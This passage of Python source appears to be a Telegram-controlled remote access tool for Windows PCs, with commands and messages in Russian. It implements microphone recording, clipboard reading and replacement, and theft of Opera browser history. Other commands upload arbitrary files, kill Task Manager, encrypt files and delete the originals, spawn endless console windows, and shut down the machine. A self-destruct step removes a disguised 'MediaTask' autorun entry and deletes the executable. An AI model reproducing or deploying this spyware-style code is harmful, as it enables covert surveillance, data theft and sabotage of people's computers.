    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и имя файла с его расширением, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(openfile.waiting_for_dfile)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(openfile.waiting_for_dfile)
async def web_record_send(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directoryopn = message.text

        if os.path.isfile(directoryopn):
            try:
                os.system(f'start "" "{directoryopn}"')
                await message.answer("Файл был успешно открыт ✅.")
            except Exception as e:
                await message.answer(f"Произошла ошибка при открытии файла: {e}")
        else:
            await message.answer(f"Файл {directoryopn} не был найден.")

        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class DirectoryStateSaveFiles(StatesGroup):
    waiting_for_directory_saveFiles = State()
    waiting_for_files = State()

MAX_ATTEMPTS = 1

@dp.message(F.text.lower() == "загрузить файл")
async def handle_text_message(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь, куда необходимо загрузить файл, пример:\n C:/Users/Public")
        await state.set_state(DirectoryStateSaveFiles.waiting_for_directory_saveFiles)
        await state.update_data(attempts=0)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(DirectoryStateSaveFiles.waiting_for_directory_saveFiles)
async def set_new_directory(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        directoryForSaveFiles = message.text
        data = await state.get_data()
        attempts = data.get('attempts', 0)

        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
            attempts += 1
            if attempts >= MAX_ATTEMPTS:
                await message.answer("Не удалось найти директорию. Повторите попытку, перезапустив процесс.")
                await state.clear()
        else:
            await state.update_data(directoryForSaveFiles=directoryForSaveFiles, attempts=0)
            await message.answer(f'Отправьте файл, который будет сохранен по этому пути:\n{directoryForSaveFiles}')
            await state.set_state(DirectoryStateSaveFiles.waiting_for_files)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(DirectoryStateSaveFiles.waiting_for_files, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def handle_document(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        user_data = await state.get_data()
        directoryForSaveFiles = user_data.get('directoryForSaveFiles')

        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
            await message.reply("Необходимо сначала указать корректный путь для сохранения файла.")
            await state.clear()
            return

        if message.document:
            document = message.document
        elif message.photo:
            document = message.photo[-1]
        else:
            await message.reply("В сообщении нет документа или фото.")
            return

        file_id = document.file_id
        file_name = document.file_name if hasattr(document, 'file_name') else "photo.jpg"

        try:
            await message.reply(f"Принял, сохраняю.")
            file_info = await bot.get_file(file_id)
            file_path = file_info.file_path
            file = await bot.download_file(file_path)
            save_path = os.path.join(directoryForSaveFiles, file_name)

            with open(save_path, 'wb') as f:
                f.write(file.read())

            await message.reply(f"Файл '{file_name}' успешно сохранен.")
            await state.clear()
        except Exception as e:
            await message.reply(f"Произошла ошибка при сохранении файла: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class microfonetime(StatesGroup):
    waiting_for_microtime = State()

@dp.message(F.text.lower() == "запись аудио")
async def audio_record(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите длительность записи в секундах")
        await state.set_state(microfonetime.waiting_for_microtime)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(microfonetime.waiting_for_microtime)
async def process_audio_time_input(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            recording_time = int(message.text)
            await start_audio_recording(message, state, recording_time)
        except ValueError:
            await message.answer("Пожалуйста, укажите правильную длительность в секундах")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

async def start_audio_recording(message: types.Message, state: FSMContext, recording_time: int):
    if message.from_user.id == ALLOWED_USER_ID:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        OUTPUT_FILENAME = "output.wav"
        save_audio = os.path.join(directory, OUTPUT_FILENAME)

        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

        await message.answer("Начало записи...")

        frames = []
        for i in range(0, int(RATE / CHUNK * recording_time)):
            data = stream.read(CHUNK)
            frames.append(data)

        await message.answer("Запись завершена.")

        stream.stop_stream()
        stream.close()
        audio.terminate()

        wf = wave.open(save_audio, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        try:
            file_to_send = FSInputFile(save_audio)
            await message.answer_document(document=file_to_send, caption="Вот запись аудио!")
            os.remove(save_audio)
            await state.clear()
        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "посмотреть буфер обмена")
async def conten(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        clipboard_content = pyperclip.paste()
        await message.answer(f"Содержимое буфера обмена:\n{clipboard_content}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class clipboard(StatesGroup):
    waiting_for_newClipboard = State()

@dp.message(F.text.lower() == "изменить буфер обмена")
async def new_Clipboard(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Хорошо, отправь мне текст на который хочешь заменить буфер обмена")
        await state.set_state(clipboard.waiting_for_newClipboard)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(clipboard.waiting_for_newClipboard)
async def new_Clipboard_wait(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        new_text = message.text
        pyperclip.copy(new_text)
        await message.answer("Текст успешно помещен в буфер обмена!")
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class url(StatesGroup):
    waiting_url = State()

@dp.message(F.text.lower() == "открыть ссылку")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Ок, кидай ссылку.")
        await state.set_state(url.waiting_url)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(url.waiting_url)
async def open_url_process(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        url_text = message.text
        webbrowser.open(url_text)

        await asyncio.sleep(1)
        await message.answer("Ссылка была успешно открыта:")
        
        screenshot = pyautogui.screenshot()
        filename = "screenshot.png"
        filepath = os.path.join(directory, filename)

        os.makedirs(directory, exist_ok=True)
        screenshot.save(filepath)

        photo = FSInputFile(filepath)
        await message.answer_photo(photo)

        if os.path.exists(filepath):
            os.remove(filepath)

        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "закрыть диспетчер задач")
async def close_task_manager(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe':
                psutil.Process(proc.info['pid']).terminate()
                await message.answer("Task Manager закрыт.")
                break
        else:
            await message.answer("Диспетчер задач не запущен.")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "история оперы")
async def cmd_opera_history(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        
        def get_opera_history():
            history_path = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\History')

            if not os.path.exists(history_path):
                return False, "Файл истории Opera не найден."

            temp_history_path = 'temp_opera_history'
            shutil.copy2(history_path, temp_history_path)

            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()

            query = """
            SELECT urls.url, urls.title, urls.last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            """
            cursor.execute(query)

            rows = cursor.fetchall()

            text_to_save = ""

            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]

                try:
                    if last_visit_time > 0:
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    last_visit_time = f'Error: {str(e)}'

                text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"

            file_path = os.path.join(directory, 'История_Оперы.txt')

            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(text_to_save)

            conn.close()
            os.remove(temp_history_path)

            return True, file_path

        await message.answer("Получение истории Opera. Пожалуйста, подождите...")
        success, result = get_opera_history()

        if not success:
            await message.answer(result)
            return

        file_path = result
        try:
            file_to_send = FSInputFile(file_path)
            await message.answer_document(document=file_to_send, caption="Вот ваш файл!")
        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
        os.remove(file_path)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "выключить звук")
async def mute_sound(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        def mute_sound_func():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(1, None)

        mute_sound_func()
        await message.answer("Звук отключен.")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "включить звук")
async def unmute_sound(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        def unmute_sound_func():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(0, None)

        unmute_sound_func()
        await message.answer("Звук включен.")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "звук на 100%")
async def max_volume(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        def set_volume_to_100():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)

        set_volume_to_100()
        await message.answer("Громкость была установлена на 100%✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class Encrypt(StatesGroup):
    waiting_d = State()

@dp.message(F.text.lower() == "зашифровать файл")
async def start_encryption(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(Encrypt.waiting_d)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Encrypt.waiting_d)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        file_path = message.text

        try:
            if os.path.exists(file_path):
                def generate_key(password: str, salt: bytes) -> bytes:
                    kdf = Scrypt(
                        salt=salt,
                        length=32,
                        n=2 ** 14,
                        r=8,
                        p=1,
                        backend=default_backend()
                    )
                    return kdf.derive(password.encode())

                def encrypt_file(file_path: str, password: str):
                    try:
                        salt = os.urandom(16)
                        key = generate_key(password, salt)

                        iv = os.urandom(16)
                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                        encryptor = cipher.encryptor()

                        with open(file_path, 'rb') as f:
                            file_data = f.read()

                        padder = padding.PKCS7(128).padder()
                        padded_data = padder.update(file_data) + padder.finalize()

                        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

                        with open(file_path + '.enc', 'wb') as f:
                            f.write(salt + iv + encrypted_data)

                    except Exception as e:
                        return False
                    return True

                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
                success = encrypt_file(file_path, password)

                if success:
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        await message.answer(f'Файл {file_path} успешно зашифрован, но произошла ошибка при удалении исходного файла.')

                    await message.answer(f'Файл {file_path} успешно зашифрован и сохранён как {file_path}.enc')
                else:
                    await message.answer(f'Произошла ошибка при шифровании файла {file_path}. Процесс прекращён.')
            else:
                await message.answer(f"Файл {file_path} не был найден.")

        except Exception as e:
            await message.answer("Произошла ошибка. Попробуйте снова.")
        finally:
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class Decipher(StatesGroup):
    waiting_d_enc = State()

@dp.message(F.text.lower() == "расшифровать файл")
async def start_decipher(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Укажите путь и расширение файла и в конце укажите '.enc', пример:\n C:/Users/Public/Название_файла.txt.enc")
        await state.set_state(Decipher.waiting_d_enc)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Decipher.waiting_d_enc)
async def process_file_path_decrypt(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        encrypted_file_path = message.text

        try:
            if os.path.exists(encrypted_file_path):
                def generate_key(password: str, salt: bytes) -> bytes:
                    kdf = Scrypt(
                        salt=salt,
                        length=32,
                        n=2 ** 14,
                        r=8,
                        p=1,
                        backend=default_backend()
                    )
                    return kdf.derive(password.encode())

                def decrypt_file(encrypted_file_path: str, password: str):
                    try:
                        with open(encrypted_file_path, 'rb') as f:
                            salt = f.read(16)
                            iv = f.read(16)
                            encrypted_data = f.read()

                        key = generate_key(password, salt)

                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                        decryptor = cipher.decryptor()

                        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

                        unpadder = padding.PKCS7(128).unpadder()
                        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

                        decrypted_file_path = encrypted_file_path.replace('.enc', '.txt')
                        with open(decrypted_file_path, 'wb') as f:
                            f.write(decrypted_data)

                        return decrypted_file_path

                    except Exception as e:
                        return None

                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
                decrypted_file_path = decrypt_file(encrypted_file_path, password)
                new_file_path = os.path.splitext(decrypted_file_path)[0]
                
                if decrypted_file_path and os.path.exists(decrypted_file_path):
                    await message.answer(f'Файл {encrypted_file_path} успешно расшифрован как {new_file_path}')

                    try:
                        os.remove(encrypted_file_path)
                        os.rename(decrypted_file_path, new_file_path)
                    except Exception as e:
                        await message.answer(f"Произошла ошибка: {e}")

                elif decrypted_file_path is None:
                    await message.answer(f'Произошла ошибка при расшифровке файла {encrypted_file_path}. Процесс прекращён.')
            else:
                await message.answer(f"Файл {encrypted_file_path} не был найден.")
        except Exception as e:
            await message.answer("Произошла ошибка. Попробуйте снова.")
        finally:
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class CMDBOOM(StatesGroup):
    waiting_CMD = State()

@dp.message(F.text.lower() == "cmd бомба")
async def start_cmd_boom(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Осторожно ❗️\nЕсли запустить эту команду бесконечно, поможет только перезагрузка ПК.\nВведи сколько раз хочешь открыть консоль: \nЕсли хочешь бесконечно, то введи 404")
        await state.set_state(CMDBOOM.waiting_CMD)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(CMDBOOM.waiting_CMD)
async def process_cmd_boom(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            BOOM = int(message.text)

            if BOOM < 0:
                await message.answer("Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.")
                return

            elif BOOM == 404:
                while True:
                    subprocess.Popen('start cmd', shell=True)
            else:
                for _ in range(BOOM):
                    subprocess.Popen('start cmd', shell=True)
                await state.clear()

            await message.answer("Консоли открыты.")

        except ValueError:
            await message.answer("Пожалуйста, введите корректное число.")
        except Exception as e:
            await message.answer(f"Произошла ошибка: {str(e)}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "данные пк")
async def handle_pc_data(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        
        pc_info = get_pc_info()
        all_pcs = await get_all_pcs_sync()
        online_pcs = get_online_pcs(all_pcs)
        
        text = (
            f"💻 **Данные текущего ПК:**\n\n"
            f"🖥️ Имя: {pc_info['pc_name']}\n"
            f"👤 Пользователь: {pc_info['username']}\n"
            f"🌐 Локальный IP: {pc_info['local_ip']}\n"
            f"🌍 Публичный IP: {pc_info['public_ip']}\n"
            f"💻 ОС: {pc_info['os']}\n"
            f"⚙️ CPU ядер: {pc_info['cpu_cores']}\n"
            f"🧠 RAM: {pc_info['ram_gb']} GB\n\n"
            f"📊 **Сеть ПК:** {len(all_pcs)} всего, {len(online_pcs)} онлайн"
        )
        
        await message.answer(text)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "диагностика сети")
async def handle_network_diagnostics(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Собираем данные это может занять некоторое время.")
        
        async def ping(host):
            try:
                result = subprocess.run(["ping", "-n", "4", host], capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                return f"Ошибка пинга: {e}"

        async def get_network_info():
            try:
                info = {}
                for iface, addrs in psutil.net_if_addrs().items():
                    info[iface] = {addr.family.name: addr.address for addr in addrs}
                return info
            except Exception as e:
                return f"Ошибка получения информации о сети: {e}"

        async def resolve_dns(host):
            try:
                ip = socket.gethostbyname(host)
                return f"IP-адрес для {host}: {ip}"
            except Exception as e:
                return f"Ошибка разрешения DNS: {e}"

        async def check_website(url):
            try:
                response = requests.get(url)
                return f"Статус сайта {url}: {response.status_code} ({response.reason})"
            except Exception as e:
                return f"Ошибка доступа к сайту: {e}"

        async def get_external_ip():
            try:
                response = requests.get('https://api.ipify.org?format=json')
                return f"Внешний IP-адрес: {response.json().get('ip')}"
            except Exception as e:
                return f"Ошибка получения внешнего IP: {e}"

        async def generate_report():
            report = []
            report.append("Отчет о сети\n")

            try:
                report.append("Результаты пинга:\n")
                report.append(await ping("google.com") + "\n")

                report.append("Информация о сети:\n")
                network_info = await get_network_info()
                if isinstance(network_info, dict):
                    for iface, addresses in network_info.items():
                        report.append(f"{iface}: {addresses}\n")
                else:
                    report.append(network_info + "\n")

                report.append("Дополнительная информация:\n")
                report.append(await resolve_dns("google.com") + "\n")
                report.append(await check_website("https://google.com") + "\n")
                report.append(await get_external_ip() + "\n")

            except Exception as e:
                report.append(f"Ошибка при создании отчета: {e}\n")

            await message.answer("".join(report))

        await generate_report()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "выключить пк")
async def shutdown_pc(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("ОК, выключаю ПК.")
        os.system('shutdown /s /t 1')
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "перезагрузить пк")
async def restart_pc(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("ОК, перезагружаю ПК.")
        os.system('shutdown /r /t 1')
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class fdesk(StatesGroup):
    waiting_photo = State()

@dp.message(F.text.lower() == "поменять обои")
async def wallpaper(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Хорошо, отправьте фото.")
        await state.set_state(fdesk.waiting_photo)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(fdesk.waiting_photo, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def receiving_photo(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            if message.content_type == ContentType.PHOTO:
                photo = message.photo[-1]
                file_id = photo.file_id
                file_name = f"{file_id}.jpg"
            elif message.content_type == ContentType.DOCUMENT:
                document = message.document
                file_id = document.file_id
                file_name = document.file_name

            file_info = await bot.get_file(file_id)
            file_path = file_info.file_path
            file = await bot.download_file(file_path)
            save_path = os.path.join(directory, file_name)

            with open(save_path, 'wb') as f:
                f.write(file.getvalue())

            def set_wallpaper(image_path):
                full_path = os.path.abspath(image_path)
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, full_path, 3)

            set_wallpaper(save_path)
            await message.reply(f"Обои успешно заменены.")
            os.remove(save_path)

        except FileNotFoundError:
            await message.reply("Ошибка: файл не найден.")
        except Exception as e:
            await message.reply(f"Произошла ошибка: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class move_file(StatesGroup):
    waiting_path1 = State()
    waiting_path2 = State()

@dp.message(F.text.lower() == "перемистить файл")
async def start_move_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Хорошо, введите путь файла, который хотите переместить (например, C:/Users/Public/Название_файла.txt):")
        await state.set_state(move_file.waiting_path1)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(move_file.waiting_path1)
async def get_source_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        source_path = message.text

        if not os.path.isfile(source_path):
            await message.answer("Файл не найден. Пожалуйста, убедитесь, что путь к файлу указан правильно и перезапустите процесс.")
            await state.clear()
            return

        await state.update_data(source_path=source_path)
        await message.answer("Теперь введите путь, куда нужно переместить файл (например, C:/Users/Public/Целевая_папка/):")
        await state.set_state(move_file.waiting_path2)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(move_file.waiting_path2)
async def get_destination_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        destination_path = message.text
        data = await state.get_data()
        source_path = data.get("source_path")

        if not os.path.isdir(destination_path):
            await message.answer("Целевая директория не найдена. Пожалуйста, убедитесь, что путь к директории указан правильно и перезапустите процесс.")
            await state.clear()
            return

        try:
            shutil.move(source_path, destination_path)
            await message.answer(f"Файл успешно перемещён в {destination_path}.")
        except FileNotFoundError:
            await message.answer("Файл или директория не найдены. Проверьте путь.")
        except PermissionError:
            await message.answer("Недостаточно прав для перемещения файла. Пожалуйста, проверьте права доступа.")
        except OSError as e:
            await message.answer(f"Ошибка доступа к файлу или директории: {e}")
        except Exception as e:
            await message.answer(f"Произошла непредвиденная ошибка: {e}")
        finally:
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class self_destruction(StatesGroup):
    waiting_code = State()

@dp.message(F.text.lower() == "самоуничтожение")
async def start_self_destruction(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await register_current_pc()
        await message.answer("Вы уверены что хотите это сделать? \nДля подтверждения отправтее эту комбинацию:'14035218'")
        await state.set_state(self_destruction.waiting_code)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(self_destruction.waiting_code)
async def process_self_destruction(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        code = message.text

        if code == '14035218':
            await message.answer("Было приятно с вами поработать, Сэр. Выполняю протокол 'самоуничтожение'.")

            def remove_from_autorun(program_name):
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                program_path = os.path.join(startup_folder, program_name + '.lnk')

                try:
                    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                                             0, winreg.KEY_SET_VALUE)
                    try:
                        winreg.DeleteValue(reg_key, program_name)
                    except FileNotFoundError:
                        pass
                    winreg.CloseKey(reg_key)

                    if os.path.isfile(program_path):
                        os.remove(program_path)
                except Exception:
                    pass

            def self_destruct():
                exe_path = sys.executable
                delete_command = f'del "{exe_path}"'
                subprocess.Popen(f'ping localhost -n 6 > nul && {delete_command}',
                                 shell=True,
                                 creationflags=subprocess.CREATE_NO_WINDOW)

            if __name__ == "__main__":
                program_name = "MediaTask"
                remove_from_autorun(program_name)
                time.sleep(1)
                self_destruct()
                sys.exit()
        else:
            await message.answer("Комбинация была введена неверно. Продолжаю работать дальше с вами, Сэр.")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# ===== ПЕРИОДИЧЕСКОЕ ОБНОВЛЕНИЕ СТАТУСА =====

async def periodic_status_update():
    """Периодически обновляет статус текущего ПК"""
    while True:
        try:
            await register_current_pc()
        except Exception as e:
            print(f"Error in periodic status update: {e}")
        
        await asyncio.sleep(300)

# ===== ЗАПУСК БОТА =====

async def main():
    init_pc_manager(bot)
    await register_current_pc()
    asyncio.create_task(periodic_status_update())
    
    print("Bot started with PC synchronization")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())